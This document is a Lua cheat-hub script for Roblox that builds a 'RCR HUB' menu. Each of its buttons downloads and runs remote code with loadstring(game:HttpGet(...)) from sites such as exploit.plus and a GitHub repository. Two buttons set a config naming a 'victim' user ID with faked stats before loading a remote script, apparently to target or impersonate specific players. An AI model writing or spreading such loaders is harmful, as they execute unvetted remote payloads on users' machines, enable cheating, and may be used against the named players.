local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "RCR HUB",
   LoadingTitle = "RCR HUB Loading...",
   LoadingSubtitle = "by me",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "RCR_Hub_Configs",
      FileName = "RCRHub"
   },
   Discord = {
      Enabled = true,
      Invite = "zeCVjkB29y",
      RememberJoins = true
   },
   KeySystem = false,
})

local MainTab = Window:CreateTab("Home", 4483362458) 

MainTab:CreateButton({
   Name = "fps booster",
   Callback = function()
       loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Optiz-FpsBooster-60070"))()
       Rayfield:Notify({
           Title = "FPS Booster",
           Content = "Performance settings applied!",
           Duration = 3,
       })
   end,
})

MainTab:CreateButton({
   Name = "stretched res",
   Callback = function()
       loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Stretched-Resolution-Higher-FOV-48170"))()
       Rayfield:Notify({
           Title = "Resolution",
           Content = "Stretched Res & FOV Loaded!",
           Duration = 3,
       })
   end,
})

MainTab:CreateButton({
   Name = "MODERN",
   Callback = function()
       loadstring(game:HttpGet('https://exploit.plus/Loader'))()
   end,
})

MainTab:CreateButton({
   Name = "xorfee",
   Callback = function()
       getgenv().Config = {
           victim = 716661842,
           helper = "",
           level = 979,
           streak = 1927,
           elo = 92802829228922892829272,
           keys = 0,
           premium = true,
           verified = false,
           unlockall = true,
           platform = "DESKTOP",
           join = "discord.gg/rivalscomp"
       }
       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
   end,
})

MainTab:CreateButton({
   Name = "nosniy",
   Callback = function()
       getgenv().Config = {
           victim = 20349956,
           helper = "",
           level = 1126,
           streak = 1927,
           elo = 92802829228922892829272,
           keys = 1000,
           premium = true,
           verified = false,
           unlockall = true,
           platform = "DESKTOP",
           join = "discord.gg/rivalscomp"
       }
       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
   end,
})

MainTab:CreateButton({
   Name = "yabujin",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/yashitcrack.lua"))()
   end,
})

MainTab:CreateButton({
   Name = "Discord",
   Callback = function()
       if (setclipboard) then
           setclipboard("https://discord.gg/zeCVjkB29y")
       end
       Rayfield:Notify({
           Title = "Discord",
           Content = "Copied link to clipboard!",
           Duration = 5,
       })
   end,
})

Rayfield:Notify({
   Title = "RCR HUB",
   Content = "Hub Successfully Loaded",
   Duration = 3,
})
